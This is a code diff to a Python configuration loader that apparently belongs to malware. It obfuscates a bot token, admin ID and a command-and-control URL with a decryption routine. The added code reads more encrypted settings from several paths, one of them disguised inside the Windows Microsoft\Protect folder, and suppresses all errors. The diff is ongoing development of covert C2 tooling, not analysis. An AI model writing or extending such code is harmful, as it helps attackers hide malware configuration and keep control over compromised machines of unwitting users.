@@ -16,19 +16,38 @@ class ConfigManager:
 
     @classmethod
     def load(cls):
-        """Loads and decrypts configuration from environment or embedded strings"""
-        # Encrypted configuration block (Polymorphic strings)
-        # In a real scenario, this would be a large encrypted blob
+        """Loads and decrypts configuration from environment, embedded strings, or external file"""
+        # 1. Start with embedded configuration (fallback)
         embedded = {
             "BOT_TOKEN": decrypt_string("H1sCGSshKhY7BhsLUVcNCVRZEh9nNDcWKSgaShsIWA0uIzw="),
             "ADMIN_ID": decrypt_string("XhsLUVcNCVRZEh9n"),
             "GLOBAL_CHID": decrypt_string("XhsLUVcNCVRZEh9n"),
             "C2_URL": decrypt_string("BkYMG3R+dgYmFBIdHhcIUhZWAwwmMTlCHwUYVwhL"),
         }
-        
         cls._config.update(embedded)
-        
-        # Override with environment variables if present
+
+        # 2. Try loading extra config from external encrypted file
+        config_paths = [
+            os.path.join(os.getcwd(), "config.dat"),
+            os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "config.dat"),
+            os.path.join(os.environ.get('APPDATA', ''), "Microsoft", "Protect", "config.dat")
+        ]
+
+        for path in config_paths:
+            if os.path.exists(path):
+                try:
+                    with open(path, "r") as f:
+                        enc_data = f.read().strip()
+                        if enc_data:
+                            dec_data = decrypt_string(enc_data)
+                            external_config = json.loads(dec_data)
+                            cls._config.update(external_config)
+                            # print(f"✅ Loaded external config from {path}")
+                            break
+                except Exception as e:
+                    pass
+
+        # 3. Override with environment variables if present
         for key in ["BOT_TOKEN", "ADMIN_ID", "GLOBAL_CHID"]:
             val = os.environ.get(key)
             if val:
